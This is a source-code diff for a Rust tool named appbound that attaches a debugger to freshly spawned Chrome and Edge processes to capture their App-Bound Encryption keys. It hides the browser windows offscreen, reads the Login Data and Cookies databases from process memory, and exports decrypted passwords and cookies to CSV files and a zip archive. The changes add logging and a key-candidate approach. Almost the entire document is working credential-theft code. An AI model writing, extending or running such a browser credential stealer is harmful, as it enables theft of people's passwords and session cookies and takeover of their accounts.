@@ -1,6 +1,7 @@
 mod crypto;
 mod db;
 mod debug;
+mod log;
 mod mem;
 mod pe;
 mod process;
@@ -28,8 +29,6 @@ struct BrowserSpec {
     name: &'static str,
     exe: &'static str,
     module: &'static str,
-    /// Chrome keeps the key pointer in R15 at the breakpoint, Edge in R14.
-    edge: bool,
 }
 
 fn file_name(path: &str) -> &str {
@@ -37,12 +36,22 @@ fn file_name(path: &str) -> &str {
 }
 
 fn banner() {
-    println!("appbound v0.1.0");
-    println!("Captures the current user's browser App-Bound Encryption key and");
-    println!("exports the default profile's saved passwords and cookies.\n");
+    crate::log_out!("appbound v0.1.0");
+    crate::log_out!("Captures the current user's browser App-Bound Encryption key and");
+    crate::log_out!("exports the default profile's saved passwords and cookies.\n");
 }
 
 fn main() {
+    let code = app();
+    crate::log_out!("");
+    crate::log_out!("--- Run finished (exit code {code}). Output was also saved to appbound.log ---");
+    crate::log_out!("Press Enter to close...");
+    let mut line = String::new();
+    let _ = std::io::stdin().read_line(&mut line);
+    exit(code);
+}
+
+fn app() -> i32 {
     banner();
 
     let specs = [
@@ -50,13 +59,11 @@ fn main() {
             name: "Chrome",
             exe: CHROME_EXE,
             module: "chrome.dll",
-            edge: false,
         },
         BrowserSpec {
             name: "Edge",
             exe: EDGE_EXE,
             module: "msedge.dll",
-            edge: true,
         },
     ];
 
@@ -65,7 +72,7 @@ fn main() {
 
     for spec in &specs {
         if let Some((browser_logins, browser_cookies)) = process_browser(spec) {
-            println!(
+            crate::log_out!(
                 "[+] {}: {} password(s), {} cookie(s)",
                 spec.name,
                 browser_logins.len(),
@@ -74,28 +81,29 @@ fn main() {
             logins.extend(browser_logins);
             cookies.extend(browser_cookies);
         }
-        println!();
+        crate::log_out!("");
     }
 
     if logins.is_empty() && cookies.is_empty() {
-        eprintln!("[-] Nothing was captured from either browser");
-        exit(1);
+        crate::log_err!("[-] Nothing was captured from either browser");
+        return 1;
     }
 
     if let Err(e) = report::write_reports(&logins, &cookies) {
-        eprintln!("[-] Failed to write reports: {e}");
-        exit(1);
+        crate::log_err!("[-] Failed to write reports: {e}");
+        return 1;
     }
 
-    println!(
+    crate::log_out!(
         "[+] Wrote passwords.csv, cookies.csv and browser_data.zip ({} password(s), {} cookie(s))",
         logins.len(),
         cookies.len()
     );
+    0
 }
 
 fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)> {
-    println!("[*] Targeting {} ({})", spec.name, spec.exe);
+    crate::log_out!("[*] Targeting {} ({})", spec.name, spec.exe);
 
     // A running instance would make the new process hand off its work and exit
     // before we can trap the decryption, so always start from a clean slate.
@@ -104,18 +112,18 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     let pi = match process::spawn_suspended(spec.exe) {
         Ok(pi) => pi,
         Err(e) => {
-            eprintln!("[-] {e} (is {} installed?)", spec.name);
+            crate::log_err!("[-] {e} (is {} installed?)", spec.name);
             return None;
         }
     };
-    println!(
+    crate::log_out!(
         "[+] Started a suspended {} process, PID {}",
         spec.name, pi.dwProcessId
     );
 
     unsafe {
         if ResumeThread(pi.hThread) == u32::MAX {
-            eprintln!("[-] ResumeThread failed");
+            crate::log_err!("[-] ResumeThread failed");
             cleanup(&pi);
             return None;
         }
@@ -125,51 +133,49 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     process::park_windows_offscreen(pi.dwProcessId, PROFILE_DB_TIMEOUT + Duration::from_secs(10));
 
     if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
-        eprintln!("[-] DebugActiveProcess failed: {e}");
+        crate::log_err!("[-] DebugActiveProcess failed: {e}");
         cleanup(&pi);
         return None;
     }
-    println!("[+] Debugger attached");
+    crate::log_out!("[+] Debugger attached");
 
-    let key = debug::run(pi.hProcess, pi.dwProcessId, spec.module, spec.edge);
+    let candidates = debug::run(pi.hProcess, pi.dwProcessId, spec.module);
 
     unsafe {
         let _ = DebugSetProcessKillOnExit(false);
         let _ = DebugActiveProcessStop(pi.dwProcessId);
     }
 
-    let key = match key {
-        Some(k) => k,
-        None => {
-            eprintln!("[-] Failed to capture the {} key", spec.name);
-            cleanup(&pi);
-            // The browser may have already spawned children by now.
-            process::terminate_matching(file_name(spec.exe));
-            return None;
-        }
-    };
-    println!(
-        "[+] {} App-Bound Encryption key: {}",
-        spec.name,
-        key.iter().map(|b| format!("{b:02X}")).collect::<String>()
+    if candidates.is_empty() {
+        crate::log_err!("[-] Failed to capture any {} key candidate", spec.name);
+        cleanup(&pi);
+        // The browser may have already spawned children by now.
+        process::terminate_matching(file_name(spec.exe));
+        return None;
+    }
+    crate::log_out!(
+        "[+] Collected {} key candidate(s) from {}",
+        candidates.len(),
+        spec.name
     );
 
     // Give the browser time to load its profile databases, then steal the
     // mapped images out of memory: Login Data lives in the browser process,
-    // Cookies in the network service process.
+    // Cookies in the network service process. The key candidates are picked
+    // apart by validating them against real encrypted blobs.
     let (login_image, cookie_image) = gather_profile_databases(spec, pi.hProcess);
 
     let logins = match login_image {
-        Some(image) => db::extract_logins(spec.name, &image, &key),
+        Some(image) => db::extract_logins(spec.name, &image, &candidates),
         None => {
-            eprintln!("[-] The Login Data database was not found in memory");
+            crate::log_err!("[-] The Login Data database was not found in memory");
             Vec::new()
         }
     };
     let cookies = match cookie_image {
-        Some(image) => db::extract_cookies(spec.name, &image, &key),
+        Some(image) => db::extract_cookies(spec.name, &image, &candidates),
         None => {
-            eprintln!("[-] The Cookies database was not found in memory");
+            crate::log_err!("[-] The Cookies database was not found in memory");
             Vec::new()
         }
     };
@@ -179,7 +185,7 @@ fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)
     process::terminate_matching(file_name(spec.exe));
 
     if logins.is_empty() && cookies.is_empty() {
-        eprintln!("[-] {} yielded no data", spec.name);
+        crate::log_err!("[-] {} yielded no data", spec.name);
         return None;
     }
 
@@ -212,7 +218,7 @@ fn gather_profile_databases(
             break;
         }
         if !process::is_alive(main_process) {
-            eprintln!(
+            crate::log_err!(
                 "[-] The {} process exited while waiting for the profile databases",
                 spec.name
             );
